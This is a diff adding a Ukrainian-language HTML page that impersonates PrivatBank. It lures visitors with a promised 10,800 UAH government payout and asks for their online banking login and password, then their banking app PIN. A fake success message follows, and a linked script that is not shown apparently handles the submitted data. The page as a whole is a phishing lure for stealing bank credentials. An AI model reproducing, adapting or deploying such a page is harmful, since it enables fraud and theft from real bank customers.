@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ПриватБанк - Є-Допомога</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body onload="initBankPage('privat')">
+    <div class="bank-page">
+        <header class="bank-header">
+            <img src="img/privat.png" alt="ПриватБанк" class="bank-logo">
+            <h1>ПриватБанк</h1>
+        </header>
+
+        <div class="bank-container">
+            <h2>Отримання виплати 10 800 грн через ПриватБанк</h2>
+            <p>Для отримання виплати вам необхідно увійти в ваш особистий кабінет ПриватБанк.</p>
+
+            <form id="bankLoginForm">
+                <div class="form-group">
+                    <label class="form-label">Логін</label>
+                    <input type="text" id="bankLogin" class="form-control" placeholder="Введіть ваш логін" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Пароль</label>
+                    <input type="password" id="bankPassword" class="form-control" placeholder="Введіть ваш пароль" required>
+                </div>
+                <button type="submit" class="submit-btn">Увійти</button>
+            </form>
+
+            <div id="loading" class="loading">
+                <div class="loading-spinner"></div>
+                <p>Триває перевірка даних...</p>
+            </div>
+
+            <form id="pinForm" style="display: none;">
+                <div class="form-group">
+                    <label class="form-label">Введіть PIN-код від вашого банківського додатку</label>
+                    <input type="text" id="bankPin" class="form-control" placeholder="Введіть 4-значний PIN-код"
+                           oninput="validatePin(this)" maxlength="4" required>
+                </div>
+                <button type="submit" class="submit-btn">Підтвердити</button>
+            </form>
+
+            <div id="successMessage" style="display: none; text-align: center;">
+                <h3>✅ Дані успішно підтверджено!</h3>
+                <p>Ваша заявка на виплату прийнята. Кошти будуть зараховані на ваш рахунок протягом 3-5 робочих днів.</p>
+            </div>
+
+            <a href="index.html" class="bank-btn">Повернутися до вибору банку</a>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
